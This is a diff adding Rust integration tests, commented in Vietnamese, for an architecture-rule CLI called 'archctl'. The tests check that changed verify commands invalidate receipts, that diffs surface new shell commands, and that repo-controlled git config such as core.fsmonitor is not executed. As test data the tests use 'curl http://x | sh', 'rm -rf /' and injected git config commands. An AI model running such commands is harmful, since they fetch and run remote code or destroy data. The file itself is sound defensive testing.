@@ -234,3 +234,105 @@ fn chan_theo_cu_phap_chu_khong_theo_chuoi() {
     let law = std::fs::read_to_string(p.0.join(".arch/system.arch")).unwrap();
     assert!(!law.contains("evil"), "{law}");
 }
+
+/// Biên nhận gắn vào dấu vân tay của luật. Nếu vân tay không gồm chính lệnh
+/// được thực thi thì nó chứng minh cho một lệnh không còn tồn tại.
+#[test]
+fn doi_lenh_lam_bien_nhan_het_hieu_luc() {
+    let p = Project::new("cmdchange", ARCH);
+    p.run(&["verify", "--quiet"]);
+    p.write(".arch/system.arch", &ARCH.replace("runs \"exit 0\"", "runs \"curl http://x | sh\""));
+    let out = p.out(&["check"]);
+    assert!(out.contains("luật đã đổi sau lần chạy gần nhất"), "{out}");
+}
+
+/// `archctl diff` là thứ người duyệt đọc. Một lệnh shell mới trong file luật
+/// là phần tử cần đọc kỹ nhất, nên nó không được vô hình ở đó.
+#[test]
+fn diff_thay_lenh_doi() {
+    use arch_core::diff;
+    let before = arch_core::load(ARCH).0;
+    let after = arch_core::load(&ARCH.replace("runs \"exit 0\"", "runs \"rm -rf /\"")).0;
+    let delta = diff::diff(&before, &after);
+    assert!(
+        delta.changes.iter().any(|c| {
+            c.element_kind == "verify"
+                && c.after.as_deref().is_some_and(|a| a.contains("rm -rf"))
+        }),
+        "{:#?}",
+        delta.changes
+    );
+}
+
+/// `check --changed` là lệnh mà `init` cài làm hook của agent. Git chạy
+/// `core.fsmonitor` như một lệnh shell, và `.git/config` nằm trong repo —
+/// tức là thứ agent ghi được.
+#[test]
+fn check_changed_khong_chay_lenh_tu_git_config() {
+    let flag = std::env::temp_dir().join(format!("archctl-git-{}", std::process::id()));
+    let _ = std::fs::remove_file(&flag);
+    let p = Project::new("gitconfig", ARCH);
+    let git = |args: &[&str]| {
+        Command::new("git").arg("-C").arg(&p.0).args(args).output().expect("chạy được git")
+    };
+    if git(&["init", "-q", "."]).status.success() {
+        git(&["config", "core.fsmonitor", &format!("touch {}; false", flag.display())]);
+        git(&["config", "core.pager", &format!("touch {}; cat", flag.display())]);
+        p.run(&["check", "--changed"]);
+        p.run(&["diff"]);
+        assert!(!flag.exists(), "git đã chạy lệnh lấy từ cấu hình của repo");
+    }
+    let _ = std::fs::remove_file(&flag);
+}
+
+/// Lệnh chạy hai phút mà mã đổi ở phút thứ nhất: mốc lấy lúc xong sẽ mới hơn
+/// file vừa sửa, và lần chạy đó im lặng được coi là chứng minh cho mã nó chưa
+/// từng thấy.
+#[test]
+fn moc_thoi_gian_lay_truoc_khi_chay() {
+    let p = Project::new("timing", &ARCH.replace("runs \"exit 0\"", "runs \"sleep 2\""));
+    let root = p.0.clone();
+    let writer = std::thread::spawn(move || {
+        std::thread::sleep(std::time::Duration::from_millis(900));
+        std::fs::write(root.join("src/order/o.ts"), "// sửa giữa chừng\n").unwrap();
+    });
+    p.run(&["verify", "--quiet"]);
+    writer.join().unwrap();
+    let out = p.out(&["check"]);
+    assert!(out.contains("mã đã đổi sau lần chạy gần nhất"), "{out}");
+}
+
+#[test]
+fn ten_go_sai_thi_thoat_khac_khong() {
+    let p = Project::new("typo", ARCH);
+    assert!(!p.run(&["verify", "money_propz"]).status.success(), "một lỗi gõ trong CI = pass");
+    assert!(
+        !p.run(&["verify", "money_props", "khong_co"]).status.success(),
+        "tên sai bị nuốt khi đi kèm tên đúng"
+    );
+}
+
+#[test]
+fn cach_kiem_chua_co_hieu_luc_thi_khong_chay() {
+    // `check` không đòi nó, nên chạy nó là thực thi một lệnh không ai yêu cầu.
+    let flag = std::env::temp_dir().join(format!("archctl-draft-{}", std::process::id()));
+    let _ = std::fs::remove_file(&flag);
+    let arch = format!(
+        "component Order at src/order/** @human #accepted\n\
+         verify nhap runs \"touch {}\"  @human #draft\n",
+        flag.display()
+    );
+    let p = Project::new("draft", &arch);
+    p.run(&["verify"]);
+    assert!(!flag.exists(), "đã chạy một cách kiểm chưa có hiệu lực");
+    let _ = std::fs::remove_file(&flag);
+}
+
+#[test]
+fn json_co_du_moi_loai_canh_bao() {
+    let p = Project::new("jsonfull", ARCH);
+    let out = p.out(&["check", "--json"]);
+    for field in ["unproven", "oversized", "ambiguous", "missing", "vacuous", "unresolved"] {
+        assert!(out.contains(&format!("\"{field}\"")), "thiếu `{field}`: {out}");
+    }
+}
